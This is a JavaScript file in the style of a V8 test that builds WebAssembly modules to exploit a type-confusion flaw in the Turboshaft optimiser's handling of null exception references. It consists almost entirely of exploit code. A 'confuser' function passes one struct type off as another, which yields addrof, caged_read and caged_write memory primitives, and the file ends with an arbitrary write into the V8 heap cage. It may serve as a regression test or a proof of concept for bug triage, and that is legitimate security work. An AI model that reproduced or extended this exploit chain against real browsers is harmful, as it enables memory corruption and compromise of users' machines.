// --experimental-wasm-exnref
d8.file.execute('test/mjsunit/wasm/wasm-module-builder.js');

let {table, global, get_rn_0, get_rn_1, is_s2} = (() => {
  let builder = new WasmModuleBuilder();

  let $s0 = builder.addStruct([makeField(kWasmI32, true)]);
  let $s2 = builder.addStruct([makeField(kWasmI32, true), makeField(wasmRefType($s0), true)]);  // tgt type

  let $sig_i_r = builder.addType(kSig_i_r);
  let $sig_rn_v = builder.addType(makeSig([], [wasmRefType(kWasmNullExnRef)]));

  let $t = builder.addTable(kWasmNullExnRef, 0, 1).exportAs('table');

  // after tier-up
  builder.addFunction('get_rn_0', $sig_rn_v).addBody([
    kExprBlock, $sig_rn_v,
      ...wasmI32Const(0), ...wasmI32Const(0), kExprI32Mul,
      kExprTableGet, $t.index,
      kExprBrOnNonNull, 0,      // liftoff: emitted, taken
      kExprUnreachable,
    kExprEnd,
  ]).exportFunc();

  // fpr tier-up
  builder.addFunction('get_rn_1', $sig_rn_v).addBody([
    kExprBlock, $sig_rn_v,
      ...wasmI32Const(0), ...wasmI32Const(1), kExprI32Mul,
      kExprTableGet, $t.index,
      kExprBrOnNonNull, 0,      // liftoff: emitted, taken
      kExprUnreachable,
    kExprEnd,
  ]).exportFunc();

  builder.addFunction('is_s2', $sig_i_r).addBody([
    kExprLocalGet, 0,
    kGCPrefix, kExprAnyConvertExtern,
    kGCPrefix, kExprRefTest, $s2,
  ]).exportFunc();

  return builder.instantiate().exports;
})();

let builder = new WasmModuleBuilder();

let $s0 = builder.addStruct([makeField(kWasmI32, true)]);
let $s1 = builder.addStruct([makeField(kWasmExternRef, true), makeField(kWasmI32, true)]);    // src type
let $s2 = builder.addStruct([makeField(kWasmI32, true), makeField(wasmRefType($s0), true)]);  // tgt type
let $sig_s2_s2 = builder.addType(makeSig([wasmRefType($s2)], [wasmRefType($s2)]));

let $sig_i_r = builder.addType(kSig_i_r);
let $sig_i_i = builder.addType(kSig_i_i);
let $sig_v_ii = builder.addType(kSig_v_ii);
let $sig_rn_v = builder.addType(makeSig([], [wasmRefType(kWasmNullExnRef)]));

let $dummy_noexn = builder.addGlobal(kWasmNullExnRef, true);
let $dummy_s1 = builder.addGlobal(wasmRefType($s1), true, false, [
  kGCPrefix, kExprStructNewDefault, $s1,
]).exportAs('dummy_s1');
let $dummy_s2 = builder.addGlobal(wasmRefType($s2), true, false, [
  ...wasmI32Const(0),
  kGCPrefix, kExprStructNewDefault, $s0,
  kGCPrefix, kExprStructNew, $s2,
]);

// import from another module to prevent inlining
let $get_rn_0 = builder.addImport('import', 'get_rn_0', $sig_rn_v); // for exploit
let $get_rn_1 = builder.addImport('import', 'get_rn_1', $sig_rn_v); // for tier-up
let $is_s2 = builder.addImport('import', 'is_s2', $sig_i_r);

// "non-null value in null-only type" case, use liftoff to get invalid types + turboshaft for the typer optimization exploit
// Case (ref none/noextern/nofunc): is_uninhabited(), return value annotation already sufficient
// Case (ref exn): !is_uninhabited() due to missing exn handling, run type "narrowing" once to force into kWasmBottom
// => BrOnCastFailImpl() -> AnnotateWasmType()
let typer_unreachable = [
  kExprBlock, kWasmVoid,
    kExprBlock, kExnRefCode,
      kExprLocalGet, 1,
      kExprIf, $sig_rn_v, // nonzero - tier-up runs
        kExprCallFunction, $get_rn_1,
      kExprElse,          // zero    - exploit runs
        kExprCallFunction, $get_rn_0,
      kExprEnd,                                   // decoder: ref noexn, typer: ref noexn
      kGCPrefix, kExprRefCastNull, kExnRefCode,   // decoder: ref null exn (nop), typer: ref noexn
      ...wasmBrOnCastFail(0, wasmRefNullType(kWasmExnRef), wasmRefNullType(kWasmNullExnRef)),
      kExprBr, 1, // continue on with rest of the exploit marked unreachable
    kExprEnd,
    // reached on liftoff: actual nullity check emitted, cast fails due to non-null
    // unreached on turboshaft: cast statically succeeds as ref T <: ref null T
    // use this as tier-up detector
    kExprGlobalGet, $dummy_s2.index,
    kExprReturn,
  kExprEnd,
];
let $confuser = builder.addFunction('confuser', makeSig([wasmRefType($s1), kWasmI32], [wasmRefType($s2)]))
  .addLocals(kWasmAnyRef, 1)
  .addLocals(kWasmI32, 1)
  .addBody([
    kExprGlobalGet, $dummy_s2.index,
    kExprLocalSet, 2,

    // everything that follows is "unreachable" for the typer
    ...typer_unreachable,

    // https://source.chromium.org/chromium/chromium/src/+/main:v8/src/compiler/turboshaft/wasm-gc-typed-optimization-reducer.cc;l=23
    // not reprocessed due to typer unreachability analysis
    kExprLoop, kWasmVoid, // reachable loop
      // not reprocessed - local.1 type analysis fails to acknowledge ref $s1
      kExprLoop, kWasmVoid,
        // typecast
        kExprLocalGet, 2,
        kGCPrefix, kExprRefCast, $s2,     // typed as ref $s2
        kExprLocalGet, 3, ...wasmI32Const(1), kExprI32Sub, kExprI32Eqz,
        kExprIf, $sig_s2_s2,              // local3 == 1 => actual type is ref $s1
          // type confusion: $s1 -> $s2
          kExprReturn,
        kExprEnd,
        kExprDrop,

        // dummy branch for loop phi
        // if (local0 == 0x42) continue;
        kExprLocalGet, 1, ...wasmI32Const(0x42), kExprI32Sub, kExprI32Eqz,
        kExprBrIf, 0,
      kExprEnd,

      // should have triggered loop phi recheck but nah, this whole thing is "unreachable"
      kExprLocalGet, 0,
      kExprLocalSet, 2,

      // local3++;
      kExprLocalGet, 3,
      kExprI32Const, 1,
      kExprI32Add,
      kExprLocalSet, 3,

      // if (--local1) continue;
      kExprLocalGet, 1,
      kExprI32Const, 1,
      kExprI32Sub,
      kExprLocalTee, 1,
      kExprBrIf, 0,
    kExprEnd,

    // only reached while running for tier-up
    kExprGlobalGet, $dummy_s2.index,
  ]
).exportFunc();

builder.addFunction('addrof', $sig_i_r).addBody([
  kExprLocalGet, 0,
  ...wasmI32Const(0),
  kGCPrefix, kExprStructNew, $s1,
  ...wasmI32Const(0),
  kExprCallFunction, $confuser.index,
  kGCPrefix, kExprStructGet, $s2, 0,
]).exportFunc();

builder.addFunction('caged_read', $sig_i_i).addBody([
  kExprRefNull, kNullExternRefCode,
  kExprLocalGet, 0,
  ...wasmI32Const(7),
  kExprI32Sub,
  kGCPrefix, kExprStructNew, $s1,
  ...wasmI32Const(0),
  kExprCallFunction, $confuser.index,
  kGCPrefix, kExprStructGet, $s2, 1,
  kGCPrefix, kExprStructGet, $s0, 0,
]).exportFunc();

builder.addFunction('caged_write', $sig_v_ii).addBody([
  kExprRefNull, kNullExternRefCode,
  kExprLocalGet, 0,
  ...wasmI32Const(7),
  kExprI32Sub,
  kGCPrefix, kExprStructNew, $s1,
  ...wasmI32Const(0),
  kExprCallFunction, $confuser.index,
  kGCPrefix, kExprStructGet, $s2, 1,
  kExprLocalGet, 1,
  kGCPrefix, kExprStructSet, $s0, 0,
]).exportFunc();

let instance = builder.instantiate({import: {get_rn_0, get_rn_1, is_s2}});
let {dummy_s1, confuser, addrof, caged_read, caged_write} = instance.exports;

// table0[0] = undefined
table.grow(1);

// turboshaft tier-up - force deterministic tier-up
%WasmTierUpFunction(confuser);

// we should have confuser tiered up, test it out again (but this time with get_rn_0)
// get_rn_0 is fresh, so we should have near 100000 more calls until it tiers up (and just add more if needed)
if (is_s2(confuser(dummy_s1.value)) != 0) {
  throw 'tier-up fail';
}

// now use the type confusion for caged write
caged_write(0x42424242, 0x13371337);
